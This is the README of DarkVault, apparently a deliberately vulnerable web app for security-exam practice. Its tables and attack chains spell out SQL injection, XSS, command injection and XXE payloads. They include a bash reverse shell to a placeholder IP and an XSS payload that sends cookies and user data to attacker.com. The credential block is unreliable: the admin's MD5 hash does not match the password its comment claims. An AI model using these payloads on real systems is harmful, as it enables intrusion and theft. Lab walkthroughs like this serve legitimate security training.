# DarkVault
A deliberately vulnerable web application designed for security testing practice and exam preparation.

## About
DarkVault is a vulnerable web application created for practicing web application security testing and preparing for penetration testing exams. It contains a comprehensive set of vulnerabilities aligned with modern security examination requirements.

## Quick Start
1. Clone the repository:
```
git clone https://github.com/yourusername/darkvault.git
cd darkvault
```

2. Install dependencies:
```
npm install
```

3. Start the application:
```
npm start
```

4. Access the application at `http://localhost:3000`

## Default Login Credentials
| Username | Password | Role | Description |
|----------|----------|------|-------------|
| admin | SecretPassword123! | Administrator | Full access to all features including admin panel |
| user1 | Password123 | Regular User | Standard user account with limited permissions |
| manager | ManageIt!2023 | Manager | Enhanced privileges but not full admin |
| test | test123 | Regular User | Test account with minimum permissions |

You can also create your own accounts through the registration page.

## Vulnerability Categories & Attack Guides

### Web Application Components (LO2.4)
DarkVault uses a variety of components, each with its own vulnerabilities:
- **Express.js framework**: Vulnerable routing and middleware implementation
- **EJS templating engine**: Template injection vulnerabilities 
- **SQLite database**: SQL injection opportunities
- **JWT authentication**: Weak implementation with token vulnerabilities
- **XML processing**: XXE vulnerabilities
- **Node.js serialization utilities**: Insecure deserialization

### Enumeration & Reconnaissance (LO3.1-LO4.3)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| Exposed API endpoints | Browse to `/api` | Look for HTML comments with API documentation |
| Information disclosure | Trigger errors by submitting invalid data | Submit malformed requests to endpoints |
| User enumeration | Compare login error messages | Try various usernames and observe response differences |
| Technical details in headers | Examine HTTP response headers | Use browser developer tools to inspect headers |
| Hidden endpoints | View source code for HTML comments | Check for commented links and endpoints |

### Authentication & Authorization (LO4.4-LO4.5)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| SQL injection in login | Bypass authentication | Enter `' OR 1=1 --` in username field, any password |
| Weak password hashing | Extract and crack hashes | Access database via SQL injection and retrieve hashes |
| JWT vulnerabilities | Gain admin privileges | Get token from `/api/auth`, modify with [jwt.io](https://jwt.io) |
| Missing access controls | Access admin features | Browse directly to `/admin` as a regular user |
| IDOR vulnerabilities | View other users' data | Change ID in URL (e.g., `/user/1` to `/user/2`) |
| Weak password reset | Exploit predictable tokens | Request password reset for a user and observe token patterns |
| Session fixation | Hijack user session | Use `/user/session-fixation?sessionId=known-value` |

### Input Validation (LO4.6)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| XSS in message board | Execute client-side code | Post `<script>alert('XSS')</script>` in message field |
| Command injection | Execute server-side commands | Enter `localhost; ls -la` in ping tool |
| SQL injection in search | Extract database data | Enter `' OR 1=1--` in search field |
| XXE in XML import | Read server files | Upload XML with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| Unrestricted file upload | Upload malicious files | Upload .php file with webshell code |
| Path traversal | Access server files | Enter `../../../etc/passwd` in file access fields |

### Information Disclosure (LO4.7)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| Path disclosure | Reveal server filesystem | Trigger errors to see file paths in stack traces |
| Source code exposure | View application code | Use `/docs/../app.js` or similar path traversal |
| User data leakage | Access private information | Use IDOR to view other users' profiles |
| Configuration exposure | View server settings | Access `/api/config` endpoint |

### Cross-Site Scripting (LO4.8)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| Stored XSS | Persistent attack | Post `<script>alert(document.cookie)</script>` to message board |
| Reflected XSS | Non-persistent attack | Use `/?search=<script>alert('XSS')</script>` in query parameters |
| DOM-based XSS | Client-side only attack | Visit `/client-render?message=<img src=x onerror="alert('DOM XSS')">` |
| Blind XSS | Admin panel XSS | Submit `<script src="https://your-server/xss.js"></script>` to contact form |

### Injection Attacks (LO4.9)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| SQL injection | Extract database data | Use `' UNION SELECT 1,2,username,password FROM users--` in search |
| Command injection | Execute OS commands | Use `; cat /etc/passwd` in command console |
| SSTI | Server-side code execution | Enter `<%= process.env %>` in template fields |
| XXE injection | Read server files | Use XML with external entities in import functions |
| NoSQL injection | Bypass NoSQL filters | Use `{"$ne":null}` in JSON parameters |

### Session Handling (LO4.10)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| Insecure session config | Examine cookies | Check cookie attributes in browser developer tools |
| Missing secure flag | Inspect cookies | Verify cookie settings lack proper security flags |
| Missing CSRF protection | Forge state-changing requests | Create HTML form that submits to vulnerable endpoint |
| Session fixation | Maintain session after login | Set session ID via URL, then login to maintain same session |

### Encryption and Encoding (LO4.11)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| Weak password hashing | Extract and crack hashes | Use SQL injection to get MD5 hashes from database |
| Weak JWT secret | Forge JWT tokens | Use "darkvault-secret-key" to sign forged tokens |
| Unencrypted sensitive data | View exposed data | Access `/api/export` to see unencrypted data |
| Weak encryption | Decrypt sensitive data | Use `/api/encrypt-data` and analyze patterns |
| Base64 misuse | Decode "encrypted" data | Check responses with Base64 data, decode with standard tools |

### Modern Web Framework Issues (LO5.17)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| DOM-based XSS | Client-side execution | Visit `/client-render` with malicious input |
| Template injection | Server-side execution | Submit template code to `/render-template` endpoint |
| Insecure deserialization | Remote code execution | Send specially crafted JSON objects with prototype pollution |

### API-Specific Vulnerabilities (LO4.15)
| Vulnerability | Attack Path | Trigger Method |
|---------------|-------------|---------------|
| GraphQL introspection | Schema discovery | Send introspection query to `/api/graphql` |
| Missing rate limiting | Brute force attacks | Send numerous requests to authentication endpoints |
| Broken object authorization | Access others' data | Directly request objects via API with different IDs |
| Improper input validation | Injection attacks | Send malformed parameters to API endpoints |

## Complete Attack Chains

### Privilege Escalation Chain
1. **Start**: Register a new account
2. **Reconnaissance**: Browse to `/site-map` to discover endpoints
3. **JWT Attack**: Login and obtain JWT from network request
4. **Manipulation**: Use [jwt.io](https://jwt.io) to change `isAdmin` to `true` and `role` to `admin`
5. **Access**: Use modified token to access `/admin` or `/api/admin/dashboard`
6. **Flag**: Capture the flag: `DARK{jwt_4dm1n_3sc4l4t10n}`

### Data Exfiltration Chain
1. **Start**: Access the search functionality
2. **Discovery**: Test for SQL injection with `'`
3. **Exploitation**: Use `' UNION SELECT 1,2,3,4,5,6,7 FROM users--` to determine column count
4. **Data theft**: Use `' UNION SELECT 1,2,id,username,password,email,7 FROM users--`
5. **Offline cracking**: Extract MD5 hashes and crack offline
6. **Flag**: Capture flag: `DARK{sql_m4st3r}`

### Complete Server Compromise Chain
1. **Start**: Login to application
2. **Discovery**: Locate command injection point at `/ping`
3. **Initial exploitation**: Enter `localhost; id` to confirm command execution
4. **Information gathering**: Use `; cat /etc/passwd` to gather system information
5. **Flag capture**: Use `; cat /opt/flag.txt` to read command injection flag
6. **Shell**: Create reverse shell with `; bash -c 'bash -i >& /dev/tcp/your-ip/your-port 0>&1'`
7. **Flag**: Capture final flag: `DARK{c0mm4nd_1nj3ct10n_pr0}`

## Advanced Vulnerability Combinations

### Client-Side Data Theft
Combine DOM-based XSS with session hijacking:
1. Identify DOM XSS vulnerability in `/client-render`
2. Craft payload: `<img src=x onerror="fetch('/api/user/'+document.cookie.split('=')[1]).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(d))))">` 
3. Send link to victims
4. Collect stolen sessions and data

### Server-Side Remote Code Execution
Chain together template injection and insecure deserialization:
1. Identify template injection in `/render-template`
2. Craft payload to access node-serialize functionality
3. Create serialized object with command execution
4. Submit to deserialization endpoint
5. Achieve remote code execution

## Default Credential Details
The database includes several accounts with different privilege levels:

```javascript
[
  {
    "id": 1,
    "username": "admin",
    "password": "5f4dcc3b5aa765d61d8327deb882cf99", // SecretPassword123!
    "role": "admin",
    "isAdmin": 1
  },
  {
    "id": 2,
    "username": "user1",
    "password": "482c811da5d5b4bc6d497ffa98491e38", // Password123
    "role": "user",
    "isAdmin": 0
  },
  {
    "id": 3,
    "username": "manager",
    "password": "e1f72e3f0be347798eff44e298a31368", // ManageIt!2023
    "role": "manager",
    "isAdmin": 0
  },
  {
    "id": 4,
    "username": "test",
    "password": "cc03e747a6afbbcbf8be7668acfebee5", // test123
    "role": "user",
    "isAdmin": 0
  }
]
```

## Flag System
DarkVault includes hidden flags that serve as proof of successful exploitation. Each vulnerability has an associated flag in the format `DARK{unique_identifier}` that can only be obtained by successfully exploiting that vulnerability.

A full list of flags and their locations is available in `/docs/flag_solutions.md` (only visible to instructors).

## Vulnerability Checklist
See `/docs/vulnerability_checklist.md` for a complete mapping of vulnerabilities to OWASP Top 10 and exam objectives.

## Warning
**IMPORTANT**: This application is deliberately vulnerable and should NOT be deployed on a production server or exposed to the internet. Use only in controlled environments for educational purposes.

## Exam Syllabus Coverage
For a complete mapping of DarkVault features to exam syllabus requirements, see `docs/exam_coverage.txt`.
